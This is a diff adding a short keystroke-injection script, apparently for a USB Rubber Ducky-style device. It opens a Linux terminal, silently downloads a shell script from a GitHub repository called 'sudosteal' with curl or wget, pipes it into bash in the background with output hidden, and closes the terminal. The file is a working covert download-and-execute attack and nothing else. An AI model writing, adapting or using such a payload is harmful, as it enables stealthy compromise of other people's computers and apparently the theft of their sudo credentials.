@@ -1,0 +1,19 @@
+REM Set default delay between all commands (in milliseconds)
+DEFAULT_DELAY 100
+
+REM --- Open Terminal ---
+REM Press Ctrl+Alt+T to open the terminal window
+CTRL ALT t
+DELAY 1000
+
+REM --- Download and Execute Payload ---
+REM Attempt to download and execute the payload script using curl; if curl fails, fallback to wget
+REM The script is fetched from GitHub and executed in the background, suppressing all output
+STRING (curl -s https://raw.githubusercontent.com/mzotic/sudosteal/main/scripts/test.sh || wget -q -O - https://raw.githubusercontent.com/mzotic/sudosteal/main/scripts/test.sh) | bash > /dev/null 2>&1 &
+ENTER
+
+DELAY 500
+
+REM ---Exit Terminal ---
+STRING exit
+ENTER
